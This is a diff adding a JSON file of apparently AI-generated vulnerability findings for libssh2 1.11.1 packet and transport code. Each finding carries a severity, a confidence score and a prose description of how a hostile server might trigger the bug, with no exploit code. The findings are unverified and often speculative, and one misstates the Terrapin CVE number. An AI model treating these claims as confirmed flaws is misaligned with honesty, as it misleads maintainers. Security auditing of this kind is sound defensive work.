@@ -1,0 +1,1087 @@
+{
+  "model": "glm-5.1",
+  "timestamp": "2026-05-04T07:07:47",
+  "target": "libssh2-1.11.1",
+  "results": [
+    {
+      "file": "libssh2/packet.c [packet_queue_listener A: channel + window L69-170]",
+      "chars": 4524,
+      "elapsed_s": 360.6,
+      "status": "ok",
+      "findings": []
+    },
+    {
+      "file": "libssh2/packet.c [packet_queue_listener B: host+port+failure L170-271]",
+      "chars": 4609,
+      "elapsed_s": 360.4,
+      "status": "ok",
+      "findings": []
+    },
+    {
+      "file": "libssh2/packet.c [_libssh2_packet_add A: dispatch+CHANNEL_DATA L634-729]",
+      "chars": 3858,
+      "elapsed_s": 125.4,
+      "status": "ok",
+      "findings": [
+        {
+          "severity": "medium",
+          "title": "Strict KEX incorrectly enabled when algorithm list is empty",
+          "line_start": 706,
+          "confidence": 0.85,
+          "description": "When parsing a KEXINIT packet, the code enables strict KEX mode if `algs_len == 0` (empty kex algorithm list). An empty algorithm list means the peer has NOT indicated support for `kex-strict-s-v00@openssh.com`, yet the code treats it as if strict KEX was agreed upon. This logic error could cause the client to enforce strict KEX rules against a peer that doesn't support them, leading to unexpected disconnections. Conversely, if this check was intended as a safety guard for `_libssh2_kex_agree_instr` with zero-length input, the fallback behavior (enabling strict KEX) is semantically incorrect and could mask a deeper parsing issue.",
+          "poc": "A malicious or malformed SSH server sends a KEXINIT packet where the kex algorithms name-list has length 0. The client will set kex_strict=1 despite the server not advertising strict KEX support, causing subsequent strict KEX enforcement (e.g., sequence number checks) to trigger false violations and disconnect the session."
+        },
+        {
+          "severity": "high",
+          "title": "Incomplete strict KEX enforcement for non-KEXINIT messages during initial KEX",
+          "line_start": 672,
+          "confidence": 0.6,
+          "description": "The strict KEX sequence enforcement only applies when `msg == SSH_MSG_KEXINIT`, checking that KEXINIT is the first packet (`seq == 0`). However, the strict KEX extension (designed to mitigate the Terrapin attack, CVE-2023-48799) requires that NO messages other than the expected KEX-phase messages be accepted during initial key exchange. The visible code does not reject unexpected message types (e.g., CHANNEL_DATA, CHANNEL_REQUEST, GLOBAL_REQUEST) received during the INITIAL_KEX state when `kex_strict` is enabled. A man-in-the-middle could inject such messages during the KEX phase, potentially leading to protocol confusion, channel data injection, or authentication bypass — the same class of vulnerability as the Terrapin attack.",
+          "poc": "An active MITM intercepts the SSH connection and, after the client sends its KEXINIT but before KEX completes, injects an SSH_MSG_CHANNEL_DATA or SSH_MSG_GLOBAL_REQUEST packet. Since the strict KEX check only validates KEXINIT sequence numbers and not other message types during INITIAL_KEX, the injected packet would be queued/processed, violating the strict KEX invariant and potentially allowing channel manipulation."
+        },
+        {
+          "severity": "low",
+          "title": "Potential out-of-bounds read when KEXINIT datalen equals minimum bound",
+          "line_start": 688,
+          "confidence": 0.45,
+          "description": "The code checks `datalen < 17` and rejects packets below this threshold, then advances `buf.dataptr += 17` to skip past the message type (1 byte) and cookie (16 bytes). When `datalen` is exactly 17, `dataptr` points to the end of the buffer. The subsequent call to `_libssh2_get_string(&buf, &algs, &algs_len)` must correctly handle the case where no data remains. If `_libssh2_get_string` does not properly validate remaining buffer length before reading the 4-byte string length prefix, an out-of-bounds read of up to 4 bytes past the buffer could occur. The return value is checked, but the read may already have happened.",
+          "poc": "Send a KEXINIT packet with datalen=17 (1 byte type + 16 byte cookie, no algorithm lists). The dataptr will equal data+17 (end of buffer). If _libssh2_get_string reads a 4-byte length prefix without checking remaining space, it reads 4 bytes beyond the allocated buffer."
+        }
+      ]
+    },
+    {
+      "file": "libssh2/packet.c [_libssh2_packet_add B: CHANNEL_EXTENDED_DATA L729-827]",
+      "chars": 3847,
+      "elapsed_s": 70.3,
+      "status": "ok",
+      "findings": [
+        {
+          "severity": "high",
+          "title": "Buffer Over-Read via Non-Null-Terminated Strings in _libssh2_debug Format String",
+          "line_start": 772,
+          "confidence": 0.85,
+          "description": "In the SSH_MSG_DISCONNECT handler, `message` and `language` are extracted via `_libssh2_get_string()`, which returns length-bounded SSH protocol strings that are NOT null-terminated. These are then passed to `_libssh2_debug()` using the `%s` format specifier, which expects null-terminated C strings. This causes reading past the intended string boundary until a null byte is encountered, leading to heap buffer over-read. An attacker can craft a DISCONNECT packet with strings that lack null terminators near the end of the allocated buffer, causing out-of-bounds reads that may leak sensitive heap data or cause a crash.",
+          "poc": "Craft an SSH_MSG_DISCONNECT packet where the description and language string fields occupy the entire remaining packet data with no trailing null bytes. For example: type=1(SSH_MSG_DISCONNECT), reason=0x0000000b, string_len=N for message, followed by N bytes of non-null data filling to the end of the packet buffer, with no language field. The _libssh2_debug call will read past the message buffer looking for a null terminator."
+        },
+        {
+          "severity": "medium",
+          "title": "Use of Uninitialized/Stale Variables in SSH_MSG_DEBUG Handler",
+          "line_start": 795,
+          "confidence": 0.8,
+          "description": "In the SSH_MSG_DEBUG case, when `datalen >= 2` but `datalen < 6`, the inner `if(datalen >= 6)` block is skipped, meaning `message`, `message_len`, `language`, and `language_len` are never assigned in this code path. However, the subsequent `LIBSSH2_DEBUG()` callback is still invoked with these unset variables. If they are uninitialized stack variables, this leaks stack memory to the callback. If they retain stale values from a previous packet (e.g., a DISCONNECT packet), this could cause out-of-bounds reads or information disclosure. If initialized to NULL, this causes a NULL pointer dereference in the callback.",
+          "poc": "Send an SSH_MSG_DEBUG packet with datalen between 2 and 5 (inclusive). For example: type=4(SSH_MSG_DEBUG), always_display=0, followed by only 0-3 more bytes (insufficient for a valid string length prefix). This triggers the outer if(datalen>=2) but skips the inner if(datalen>=6), leaving message/language variables unset when LIBSSH2_DEBUG is called."
+        },
+        {
+          "severity": "medium",
+          "title": "Missing Return Value Checks on _libssh2_get_string in SSH_MSG_DISCONNECT",
+          "line_start": 762,
+          "confidence": 0.75,
+          "description": "The `_libssh2_get_string()` calls for extracting `message` and `language` from a DISCONNECT packet do not check their return values. If the packet is malformed (e.g., a string length field claims more data than available), `_libssh2_get_string()` may fail and leave `message`/`language` as NULL or point to invalid memory. These are then dereferenced in both `LIBSSH2_DISCONNECT()` and the `_libssh2_debug()` `%s` format string, causing NULL pointer dereference or invalid memory access.",
+          "poc": "Send an SSH_MSG_DISCONNECT packet with a message string length field that exceeds the remaining packet data. For example: type=1, reason=0x0000000b, message_len=0xFFFFFFFF (but only 0 bytes of actual message data follow). The _libssh2_get_string call fails, potentially leaving message as NULL, which is then passed to %s in _libssh2_debug."
+        }
+      ]
+    },
+    {
+      "file": "libssh2/packet.c [_libssh2_packet_add C: CHANNEL_EOF+CLOSE L827-925]",
+      "chars": 3830,
+      "elapsed_s": 204.5,
+      "status": "ok",
+      "findings": [
+        {
+          "severity": "high",
+          "title": "Unchecked return values from _libssh2_get_string in SSH_MSG_EXT_INFO handler leading to NULL pointer dereference",
+          "line_start": 872,
+          "confidence": 0.88,
+          "description": "The return values of _libssh2_get_string() calls on lines ~872-873 are not checked. If the first call succeeds (parsing 'name' as 'server-sig-algs') but the second call fails (e.g., the value string's length field extends beyond the packet buffer), 'value' remains NULL while the code proceeds to the 'server-sig-algs' processing block. This results in: (1) memcpy(session->server_sign_algorithms, value, value_len) with value==NULL, which is undefined behavior per C99 §7.21.1 — if value_len is non-zero (possible depending on _libssh2_get_string implementation setting *outlen before bounds check), this causes a crash; (2) even with value_len==0, memcpy(ptr, NULL, 0) is UB; (3) session->server_sign_algorithms gets set to an empty string, potentially degrading algorithm negotiation security. Additionally, memcmp(name, ...) on line ~885 could dereference NULL if name_len is incorrectly non-zero on parse failure. A malicious SSH server can trigger this by sending a crafted SSH_MSG_EXT_INFO with a valid 'server-sig-algs' name but a truncated/malformed value string.",
+          "poc": "A malicious SSH server sends during key exchange: SSH_MSG_EXT_INFO packet with nr_extensions=1, name='server-sig-algs' (length=15, valid), value with length field claiming e.g. 100 bytes but packet only contains 5 bytes remaining. The _libssh2_get_string for name succeeds, but for value fails (bounds check). Since return value is unchecked, code proceeds to memcpy with value=NULL, causing crash or UB."
+        },
+        {
+          "severity": "medium",
+          "title": "Loop continues processing extensions after _libssh2_get_string parse failure without setting error code",
+          "line_start": 863,
+          "confidence": 0.75,
+          "description": "The while loop at line ~863 continues iterating as long as rc==0 and nr_extensions>0. When _libssh2_get_string fails, its return value is ignored and rc is not updated to indicate an error. This means the loop will continue processing additional extensions even after a parse failure, potentially reading from an inconsistent buffer state (buf.dataptr may have been partially advanced by _libssh2_get_u32 inside _libssh2_get_string even though the overall function failed). This could lead to processing garbage data as extension names/values, potentially matching 'server-sig-algs' with attacker-controlled content from misinterpreted buffer regions.",
+          "poc": "Send SSH_MSG_EXT_INFO with nr_extensions=3. First extension: valid name but malformed value (parse fails, rc stays 0). Second extension: due to inconsistent buf.dataptr state, garbage data is interpreted as name/value. If garbage happens to match 'server-sig-algs', attacker-influenced data gets stored in session->server_sign_algorithms."
+        },
+        {
+          "severity": "low",
+          "title": "Integer truncation in _libssh2_debug format string for extension name/value lengths",
+          "line_start": 876,
+          "confidence": 0.65,
+          "description": "The _libssh2_debug call casts name_len and value_len (size_t) to int for the %.*s format specifier. On systems where size_t is 64-bit and int is 32-bit, a string length exceeding INT_MAX (2^31-1) would be truncated to a negative value when cast to int. A negative precision value in %.*s is implementation-defined and could cause unexpected behavior in the debug formatting function. While SSH packets are typically limited in size making this unlikely, it represents a defensive coding deficiency.",
+          "poc": "Theoretical: send SSH_MSG_EXT_INFO with a string length field of 0x80000001 (2147483649). The (int) cast produces a negative value, causing undefined behavior in the debug format handler."
+        }
+      ]
+    },
+    {
+      "file": "libssh2/packet.c [_libssh2_packet_add D: CHANNEL_REQUEST L925-1021]",
+      "chars": 3833,
+      "elapsed_s": 328.4,
+      "status": "ok",
+      "findings": [
+        {
+          "severity": "high",
+          "title": "Integer Overflow and Underflow in Window Size Calculation",
+          "line_start": 1003,
+          "confidence": 0.9,
+          "description": "The condition `channelp->read_avail + datalen - data_head >= channelp->remote.window_size` is susceptible to an integer overflow when `read_avail` is large. This bypasses the check intended to cap `datalen`. Subsequently, `channelp->remote.window_size -= (uint32_t)(datalen - data_head);` can underflow if `datalen - data_head` is greater than `window_size`, or if `window_size - read_avail` underflows during the cap calculation. This allows a malicious server to inflate the client's window size arbitrarily, bypassing flow control and leading to memory exhaustion (DoS).",
+          "poc": "A malicious server sends a large amount of data to increase `read_avail` close to 0xFFFFFFFF. Then it sends a small packet (e.g., 32 bytes) when `window_size` is small (e.g., 10). The overflow causes the check to be bypassed, and `window_size` underflows to a huge value."
+        },
+        {
+          "severity": "medium",
+          "title": "State Machine Bug leads to Window Size Inflation via EAGAIN",
+          "line_start": 998,
+          "confidence": 0.8,
+          "description": "When handling `SSH_MSG_CHANNEL_EXTENDED_DATA` in ignore mode, the code frees the packet data and decreases `window_size`. It then attempts to send a window adjust by calling `_libssh2_channel_receive_window_adjust`. If this function returns `EAGAIN`, the state is saved and the function returns. Upon re-entry with a new packet, it resumes at `libssh2_packet_add_jump_point1` but uses the new packet's `datalen` and `data_head` local variables. This causes the window to be adjusted by the new packet's size instead of the original packet's size. A malicious server can exploit this by sending a small extended data packet, forcing an `EAGAIN`, and then sending a large packet, inflating the window size and bypassing flow control.",
+          "poc": "Server sends a 14-byte `SSH_MSG_CHANNEL_EXTENDED_DATA` packet. Client decreases window by 1 and tries to adjust. Server blocks socket to cause `EAGAIN`. Server then sends a 34000-byte `SSH_MSG_IGNORE` packet. Client resumes and increases window by 34000. Net window inflation: 33999 bytes."
+        }
+      ]
+    },
+    {
+      "file": "libssh2/packet.c [_libssh2_packet_add E: CHANNEL_REQUEST types L1021-1112]",
+      "chars": 3814,
+      "elapsed_s": 269.7,
+      "status": "ok",
+      "findings": [
+        {
+          "severity": "high",
+          "title": "Integer overflow in channel window size check allows bypassing flow control",
+          "line_start": 1057,
+          "confidence": 0.75,
+          "description": "The check `channelp->read_avail + datalen - data_head > channelp->remote.window_size` on line 1057 can overflow on 32-bit systems where `size_t` is 32 bits. If `read_avail` is large (e.g., 0x80000000) and `datalen - data_head` is also large (e.g., 0x80000006), the sum wraps around to a small value, bypassing the window size limit. The subsequent update `channelp->read_avail += datalen - data_head` on line 1068 then stores a wrapped value, making it appear that less data was received than actually was. This allows a malicious SSH server to send far more data than the channel window permits, potentially causing buffer overflows or memory corruption in upper-layer consumers that trust the window size invariant.",
+          "poc": "A malicious SSH server targeting a 32-bit client: 1) Open a channel with a large window_size (e.g., 0xFFFFFFFF). 2) Send many small data packets until read_avail approaches 0x80000000. 3) Send a single large data packet with datalen such that read_avail + datalen - data_head wraps around to a value <= window_size. The overflow check is bypassed, read_avail wraps to a small value, and subsequent packets are accepted beyond the window limit."
+        },
+        {
+          "severity": "high",
+          "title": "Use of potentially uninitialized/stale channel pointer in CHANNEL_EOF handling",
+          "line_start": 1078,
+          "confidence": 0.7,
+          "description": "In the SSH_MSG_CHANNEL_EOF case, `channelp` is only assigned when `datalen >= 5`. If a malformed CHANNEL_EOF message arrives with `datalen < 5`, `channelp` is never set in this case block. The subsequent `if(!channelp)` check then operates on whatever value `channelp` held before entering this switch case — which could be an uninitialized local variable (undefined behavior) or a stale pointer from earlier processing. If the stale pointer references freed memory, this constitutes a use-after-free when `channelp->remote.eof = 1` is executed on line 1095. A malicious SSH server can craft a minimal CHANNEL_EOF packet (1-4 bytes) to trigger this path.",
+          "poc": "A malicious SSH server sends a truncated SSH_MSG_CHANNEL_EOF (message type 0x60) packet containing only 1-4 bytes total (instead of the required 5+). This skips the channelp assignment, and if channelp holds a stale pointer from prior packet processing, the code dereferences it on line 1095 (channelp->remote.eof = 1), causing a use-after-free or crash."
+        },
+        {
+          "severity": "medium",
+          "title": "Integer underflow in channel window adjustment via datalen - 13",
+          "line_start": 1021,
+          "confidence": 0.6,
+          "description": "The expression `(uint32_t)(datalen - 13)` on line 1024 is passed to `_libssh2_channel_receive_window_adjust` as the adjustment amount. If `datalen < 13`, the subtraction underflows (since `datalen` is likely an unsigned type), producing a very large uint32_t value. This would inflate the receive window by a massive amount, allowing the remote side to send far more data than the protocol permits. While this code is reached via a state jump (libssh2_NB_state_jump1) suggesting prior validation may exist, if any code path reaches this with `datalen < 13`, the window adjustment becomes corrupted.",
+          "poc": "A malicious SSH server sends a CHANNEL_REQUEST (e.g., exit-signal) with a total datalen less than 13 bytes. If the state machine reaches the window adjustment code at line 1024, the underflow of (datalen - 13) produces a value near UINT32_MAX, which is passed to _libssh2_channel_receive_window_adjust, inflating the window and allowing unbounded data transmission."
+        },
+        {
+          "severity": "medium",
+          "title": "Integer underflow in datalen truncation when read_avail exceeds window_size",
+          "line_start": 1060,
+          "confidence": 0.55,
+          "description": "On line 1062, the truncation formula `datalen = channelp->remote.window_size - channelp->read_avail + data_head` can underflow if `read_avail > window_size`. While the check on line 1044 (`window_size <= read_avail`) should prevent this, if `read_avail` has been corrupted (e.g., via the integer overflow in finding #1), `read_avail` could exceed `window_size`, causing this subtraction to wrap to a very large value. This would set `datalen` to an enormous value instead of truncating it, leading to buffer over-reads when the data is subsequently processed.",
+          "poc": "First trigger the integer overflow in finding #1 to corrupt read_avail to a value larger than window_size. Then send another data packet. The check on line 1044 is bypassed (read_avail was wrapped small by the overflow, but after the += on line 1068 it could exceed window_size in a subsequent call). The truncation on line 1062 underflows, setting datalen to a huge value, causing out-of-bounds access."
+        }
+      ]
+    },
+    {
+      "file": "libssh2/packet.c [_libssh2_packet_add F: DISCONNECT+IGNORE L1112-1190]",
+      "chars": 3851,
+      "elapsed_s": 360.4,
+      "status": "ok",
+      "findings": []
+    },
+    {
+      "file": "libssh2/packet.c [_libssh2_packet_add G: SERVICE_ACCEPT+BANNER L1190-1287]",
+      "chars": 3846,
+      "elapsed_s": 78.8,
+      "status": "ok",
+      "findings": [
+        {
+          "severity": "high",
+          "title": "Heap Buffer Over-Read in want_reply memcpy Without Bounds Check",
+          "line_start": 1193,
+          "confidence": 0.7,
+          "description": "The `memcpy(&packet[1], data + 1, 4)` copies 4 bytes from the incoming packet data starting at offset 1 without verifying that `datalen >= 5`. If a malformed or truncated SSH packet reaches this code path with fewer than 5 bytes, this results in a heap buffer over-read. The jump point `libssh2_packet_add_jump_point4` allows re-entry into this block, but no length validation is performed either on initial entry or re-entry. An attacker crafting a short packet that reaches this code path could read beyond the allocated buffer, potentially leaking heap data or causing a crash.",
+          "poc": "Send a crafted SSH_MSG_CHANNEL_REQUEST packet with want_reply=true but with datalen < 5 (e.g., only 2-3 bytes of payload after the message type). The memcpy will read 4 bytes from data+1, exceeding the actual buffer allocation. A minimal triggering packet: message type byte for channel request + 1-3 additional bytes, with the want_reply field set to true."
+        },
+        {
+          "severity": "medium",
+          "title": "Ineffective/No-op Length Validation in SSH_MSG_CHANNEL_OPEN Handler",
+          "line_start": 1259,
+          "confidence": 0.85,
+          "description": "The check `if(datalen < 17) ;` has an empty body (just a semicolon), making it completely ineffective. Per RFC 4254, SSH_MSG_CHANNEL_OPEN requires at minimum: 1 byte (type) + 4 bytes (string length) + 7 bytes (\"session\") + 4 bytes (sender channel) + 4 bytes (initial window) = 20 bytes. The check for 17 bytes is already too low, and even that check does nothing. While the subsequent string comparison branches each have their own length guards (`datalen >= (strlen(...) + 5)`), if none of the known channel types match and datalen is small, the code silently falls through without returning an error or sending a channel open failure message, violating the SSH protocol specification.",
+          "poc": "Send an SSH_MSG_CHANNEL_OPEN packet with an unrecognized channel type string and datalen between 5-16 bytes. The `if(datalen < 17) ;` guard does nothing, the string comparisons won't match, and the code falls through without sending SSH_MSG_CHANNEL_OPEN_FAILURE as required by RFC 4254. This could leave the connection in an inconsistent state."
+        },
+        {
+          "severity": "medium",
+          "title": "Missing Channel Open Failure Response for Unknown Channel Types",
+          "line_start": 1259,
+          "confidence": 0.8,
+          "description": "When an SSH_MSG_CHANNEL_OPEN message is received with a channel type that doesn't match 'forwarded-tcpip', 'x11', or 'auth-agent@openssh.com', the code falls through all the else-if branches without sending an SSH_MSG_CHANNEL_OPEN_FAILURE response. RFC 4254 Section 5.1 mandates that if a channel open request is rejected, the recipient MUST respond with SSH_MSG_CHANNEL_OPEN_FAILURE. The missing response could cause the sender to hang indefinitely waiting for a response, enabling a denial-of-service condition. Combined with the no-op length check, this is a protocol compliance violation that has security implications.",
+          "poc": "Send SSH_MSG_CHANNEL_OPEN with channel type set to an unknown string like 'unknown-channel' with proper length encoding. The server will not send any response, causing the client to wait indefinitely or timeout, depending on implementation."
+        }
+      ]
+    },
+    {
+      "file": "libssh2/packet.c [_libssh2_packet_add H: GLOBAL_REQUEST+callback L1287-1395]",
+      "chars": 4028,
+      "elapsed_s": 360.5,
+      "status": "ok",
+      "findings": []
+    },
+    {
+      "file": "libssh2/transport.c [fullpacket A: decrypt+MAC verify L184-261]",
+      "chars": 3254,
+      "elapsed_s": 104.1,
+      "status": "ok",
+      "findings": [
+        {
+          "severity": "critical",
+          "title": "Integer Underflow in fullpacket_payload_len Calculation",
+          "line_start": 195,
+          "confidence": 0.85,
+          "description": "The expression `p->packet_length - 1` can underflow if `packet_length` is 0. Since `fullpacket_payload_len` is likely a uint32_t, this would result in a value of 0xFFFFFFFF. This corrupted length is then used in the non-ETM MAC hash computation as the length of `p->payload`, causing a massive out-of-bounds read. An attacker who can control or influence `packet_length` (e.g., during the unencrypted phase of SSH negotiation) can trigger this to leak heap memory or crash the process.",
+          "poc": "Craft an SSH packet with packet_length field set to 0. When processed by fullpacket(), fullpacket_payload_len becomes 0xFFFFFFFF. The subsequent call to remote_mac->hash() with this length will read far beyond the payload buffer, causing a heap buffer over-read."
+        },
+        {
+          "severity": "high",
+          "title": "Integer Underflow in decrypt_size Calculation (ETM Path)",
+          "line_start": 244,
+          "confidence": 0.8,
+          "description": "In the Encrypt-then-MAC path, `decrypt_size = p->total_num - mac_len - 4` can underflow if `total_num` is less than `mac_len + 4`. Since `total_num` and `mac_len` are likely unsigned types, the subtraction wraps to a very large value. This is then passed to `LIBSSH2_ALLOC()`, which takes a `size_t` parameter. The allocation will either fail (DoS) or, on systems with memory overcommit, succeed with a tiny buffer while subsequent decryption writes beyond its bounds, causing a heap overflow.",
+          "poc": "Send a crafted SSH packet in ETM mode where total_num < mac_len + 4. The underflow causes decrypt_size to wrap to a huge value. On systems with overcommit, the allocation may succeed, and the subsequent decrypt() call writes past the allocated buffer."
+        },
+        {
+          "severity": "high",
+          "title": "Timing Side-Channel in MAC Verification",
+          "line_start": 222,
+          "confidence": 0.95,
+          "description": "The MAC comparison uses `memcmp()`, which is not constant-time. Standard `memcmp` implementations return as soon as a mismatched byte is found, leaking timing information about how many leading bytes of the MAC are correct. An active network attacker can exploit this via a timing side-channel attack to forge MACs byte-by-byte, potentially bypassing message authentication in SSH sessions.",
+          "poc": "An attacker intercepts SSH traffic and modifies ciphertext while brute-forcing the MAC. By measuring response times (where earlier byte mismatches return faster), the attacker can determine the correct MAC value one byte at a time, eventually forging valid MACs for injected packets."
+        },
+        {
+          "severity": "high",
+          "title": "Integer Underflow in ETM MAC Hash Length Parameter",
+          "line_start": 203,
+          "confidence": 0.75,
+          "description": "In the ETM MAC calculation, `p->total_num - mac_len` is passed as the data length to `remote_mac->hash()`. If `p->total_num < mac_len`, this unsigned subtraction underflows to a very large value, causing the hash function to read far beyond the payload buffer. This results in a heap buffer over-read that can leak sensitive memory contents.",
+          "poc": "Craft an SSH packet where total_num (total bytes read) is less than the MAC length. The expression `p->total_num - mac_len` underflows, and the hash function reads a massive amount of heap memory beyond the payload buffer."
+        },
+        {
+          "severity": "high",
+          "title": "Integer Underflow in MAC Comparison Pointer Arithmetic",
+          "line_start": 222,
+          "confidence": 0.75,
+          "description": "The MAC comparison accesses `p->payload + p->total_num - mac_len`. If `p->total_num < mac_len`, the subtraction underflows (unsigned), resulting in a pointer that points far before the start of the payload buffer. The subsequent `memcmp` with `mac_len` bytes reads from this invalid memory location, causing an out-of-bounds read and potential crash or information leak.",
+          "poc": "Send a packet where total_num is smaller than mac_len. The pointer arithmetic `p->payload + p->total_num - mac_len` wraps to an address before the buffer, and memcmp reads from invalid memory."
+        },
+        {
+          "severity": "medium",
+          "title": "Unvalidated Padding Length After Decryption",
+          "line_start": 261,
+          "confidence": 0.7,
+          "description": "After decrypting the first block in the ETM path, `p->padding_length = first_block[0]` is set without any validation. If the decrypted padding length exceeds the actual packet data, subsequent calculations of the real payload length (e.g., `fullpacket_payload_len - padding_length`) can underflow. This can lead to buffer over-reads when processing the payload, similar to classic padding oracle attacks.",
+          "poc": "Craft a ciphertext that, when decrypted, yields a first byte (padding_length) larger than the packet data allows. Downstream code that subtracts this padding_length from the payload length will underflow, causing out-of-bounds memory access."
+        }
+      ]
+    },
+    {
+      "file": "libssh2/transport.c [fullpacket B: decompression+dispatch L261-349]",
+      "chars": 3285,
+      "elapsed_s": 145.6,
+      "status": "ok",
+      "findings": [
+        {
+          "severity": "critical",
+          "title": "Integer underflow in padding length subtraction",
+          "line_start": 289,
+          "confidence": 0.85,
+          "description": "The subtraction `session->fullpacket_payload_len -= p->padding_length` can underflow if `p->padding_length` exceeds `fullpacket_payload_len`. Since `fullpacket_payload_len` is likely a `size_t` (unsigned), this wraps to a near-maximum value. This corrupted length is then passed to the decompression function `decomp()` as the input buffer length, causing a massive heap buffer over-read. It is also passed to `_libssh2_packet_add()`, potentially causing further memory corruption. The `padding_length` field originates from the network packet and may not be validated against the payload length before this subtraction.",
+          "poc": "A MITM attacker or malicious server sends an SSH packet where the padding_length byte is set to a value larger than the actual payload size (e.g., padding_length=255 with a minimal payload). If the MAC check is deferred or bypassed (e.g., during key exchange or via CBC padding oracle), the underflow occurs. The resulting huge `fullpacket_payload_len` causes `decomp()` to read far beyond the allocated `p->payload` buffer, leaking heap memory."
+        },
+        {
+          "severity": "high",
+          "title": "Out-of-bounds read on empty/zero-length payload",
+          "line_start": 318,
+          "confidence": 0.8,
+          "description": "The access `p->payload[0]` is performed without verifying that `fullpacket_payload_len > 0`. If the padding subtraction results in a zero-length payload (e.g., `padding_length == packet_length - 1`), or if the decompression callback returns `data_len == 0`, then `p->payload[0]` is an out-of-bounds read. This could leak a single byte of heap metadata or adjacent data, or cause a crash if the allocation is zero-sized.",
+          "poc": "Send a packet where padding_length equals packet_length - 1, resulting in fullpacket_payload_len = 0 after subtraction. The subsequent `p->payload[0]` dereference reads one byte past the valid payload region. Alternatively, craft a compressed payload that decompresses to zero bytes, triggering the same OOB read."
+        },
+        {
+          "severity": "medium",
+          "title": "Use-after-free in decompression error path",
+          "line_start": 311,
+          "confidence": 0.75,
+          "description": "When `session->remote.comp->decomp()` returns an error, `p->payload` has already been freed via `LIBSSH2_FREE(session, p->payload)`, but the pointer in `p->payload` is not set to NULL. The function returns the error code, but the stale pointer remains in the `p` structure. If the caller or any cleanup/error-handling code later accesses or frees `p->payload`, this results in a use-after-free or double-free vulnerability.",
+          "poc": "Trigger a decompression error by sending a malformed compressed payload. The `decomp()` call fails, `p->payload` is freed but not nullified. If the session's state machine retries or cleans up, accessing `p->payload` causes use-after-free. In a non-blocking scenario (EAGAIN), the stale pointer could be dereferenced on re-entry."
+        },
+        {
+          "severity": "high",
+          "title": "Integer underflow in ETM memmove length calculation",
+          "line_start": 283,
+          "confidence": 0.7,
+          "description": "In the Encrypt-then-MAC (ETM) code path, `memmove(p->payload, &p->payload[1], p->packet_length - 1)` uses `p->packet_length - 1` as the length. If `p->packet_length` is 0 (unsigned type), this underflows to SIZE_MAX, causing `memmove` to copy an enormous amount of data, resulting in heap buffer overflow and memory corruption. In ETM mode, the packet_length field is transmitted in the clear; if MAC verification has not yet occurred at this point, an attacker can manipulate it.",
+          "poc": "In an active network position during an ETM-mode session, modify the unencrypted packet_length field to 0 before the MAC is verified. The `memmove` length underflows to SIZE_MAX, causing a massive out-of-bounds write from `&p->payload[1]` to `p->payload`, corrupting heap memory and likely enabling code execution."
+        }
+      ]
+    },
+    {
+      "file": "libssh2/transport.c [_libssh2_transport_read A: recv+packet_len L367-467]",
+      "chars": 4398,
+      "elapsed_s": 60.8,
+      "status": "ok",
+      "findings": [
+        {
+          "severity": "high",
+          "title": "Assert used for security-critical invariant check (compiled out in release builds)",
+          "line_start": 458,
+          "confidence": 0.85,
+          "description": "The code uses `assert(remainbuf >= 0)` to validate that the buffer index calculation `p->writeidx - p->readidx` is non-negative. In release/production builds, `assert()` is typically compiled out by defining `NDEBUG`, removing this safety check entirely. If `writeidx` becomes less than `readidx` due to corruption, race condition, or malicious input, `remainbuf` would be negative and used as a `ssize_t` in subsequent arithmetic and memory operations. A negative `remainbuf` would bypass the `remainbuf < blocksize` check (since negative < positive is true, but the subsequent logic may misinterpret the negative value), potentially leading to buffer over-reads, heap corruption, or remote code execution.",
+          "poc": "1. Build libssh2 with NDEBUG defined (typical for release builds).\n2. Craft an SSH session where packet buffer indices become inconsistent (e.g., via interrupted non-blocking reads that corrupt p->writeidx or p->readidx).\n3. The assert is a no-op, so remainbuf goes negative undetected.\n4. Subsequent logic uses the negative remainbuf value, causing out-of-bounds memory access."
+        },
+        {
+          "severity": "high",
+          "title": "Integer overflow via ssize_t cast of total_num in full-packet check",
+          "line_start": 462,
+          "confidence": 0.7,
+          "description": "The condition `((ssize_t)p->total_num) > remainbuf` casts `p->total_num` (likely an unsigned type such as `size_t` or `uint32_t`) to `ssize_t`. If an attacker can influence `total_num` to a value larger than `SSIZE_MAX` (e.g., via a malicious packet length field in the SSH protocol), the cast produces a negative `ssize_t` value. A negative value would compare less than `remainbuf`, causing the check to evaluate to false and bypass the buffer-sufficiency validation. This could lead to processing a packet without enough data buffered, resulting in heap buffer over-read or other memory safety violations.",
+          "poc": "1. During SSH transport, craft a packet with a length field that decodes to a value > SSIZE_MAX (e.g., 0x80000000 on 32-bit or similar on 64-bit depending on total_num type).\n2. p->total_num is set to this large unsigned value.\n3. The cast to ssize_t wraps to negative.\n4. The REQUIRES_FULL_PACKET check is bypassed.\n5. Decryption/processing proceeds with insufficient buffer data, causing out-of-bounds reads."
+        },
+        {
+          "severity": "medium",
+          "title": "Unvalidated blocksize from remote crypt method against MAX_BLOCKSIZE",
+          "line_start": 413,
+          "confidence": 0.55,
+          "description": "When encrypted, `blocksize` is set directly from `session->remote.crypt->blocksize` without validation against `MAX_BLOCKSIZE`. The local stack buffer `block` is declared as `unsigned char block[MAX_BLOCKSIZE]`. If the remote crypt method's blocksize field is corrupted, improperly initialized, or set to a value exceeding `MAX_BLOCKSIZE` (through memory corruption or a flawed kex negotiation), subsequent decryption operations that write `blocksize` bytes into the `block` buffer would overflow the stack buffer. While the blocksize values for standard SSH ciphers are well-defined, the lack of an explicit bounds check is a defense-in-depth gap.",
+          "poc": "1. Through memory corruption or a buggy kex negotiation path, set session->remote.crypt->blocksize to a value > MAX_BLOCKSIZE.\n2. When the encrypted path is taken, blocksize exceeds the stack buffer size.\n3. Decryption writes beyond block[MAX_BLOCKSIZE], corrupting the stack.\n4. Potential code execution via overwritten return address."
+        },
+        {
+          "severity": "medium",
+          "title": "auth_len from remote crypt not validated before use",
+          "line_start": 420,
+          "confidence": 0.5,
+          "description": "When `CRYPT_FLAG_R(session, REQUIRES_FULL_PACKET)` is set, `auth_len` is assigned directly from `session->remote.crypt->auth_len` without validation. This value is used later (outside the shown snippet) to determine how many bytes to allocate or process for the authentication tag. If `auth_len` is set to an unexpectedly large or zero value through corruption or a malicious negotiation, it could lead to buffer overflows (if too large) or authentication bypass (if zero, causing the tag verification to be skipped or trivially pass). The lack of bounds checking on this attacker-influenced value is a security concern.",
+          "poc": "1. Manipulate session state so that session->remote.crypt->auth_len is 0 or an extremely large value.\n2. If auth_len=0, authentication tag verification may be skipped, allowing packet forgery.\n3. If auth_len is very large, subsequent buffer allocations based on it could overflow or cause excessive memory consumption."
+        }
+      ]
+    },
+    {
